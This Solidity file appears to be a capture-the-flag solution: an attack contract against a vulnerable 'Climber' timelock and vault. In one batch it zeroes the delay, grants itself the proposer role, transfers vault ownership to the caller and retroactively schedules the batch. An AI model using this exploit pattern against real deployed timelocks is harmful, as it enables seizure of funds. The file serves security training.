// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ClimberAttack {
    ClimberTimelock private climberTimelock;
    bytes32 private constant salt = keccak256("SALT");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(address payable climberTimelock_, address climberVaultAddress_)
    {
        climberTimelock = ClimberTimelock(climberTimelock_);
        targets = [
            address(climberTimelock),
            address(climberTimelock),
            climberVaultAddress_
        ];
        values = [0, 0, 0, 0];
    }

    function attack() external {
        bytes memory updateDelay = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        bytes memory setupRole = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        bytes memory transferOwnership = abi.encodeWithSignature(
            "transferOwnership(address)",
            msg.sender
        );

        bytes memory scheduleCall = abi.encodeWithSignature("schedule()");

        dataElements.push(updateDelay);
        dataElements.push(setupRole);
        dataElements.push(transferOwnership);
        dataElements.push(scheduleCall);

        targets.push(address(this));

        climberTimelock.execute(targets, values, dataElements, salt);
    }

    function schedule() public {
        climberTimelock.schedule(targets, values, dataElements, salt);
    }
}
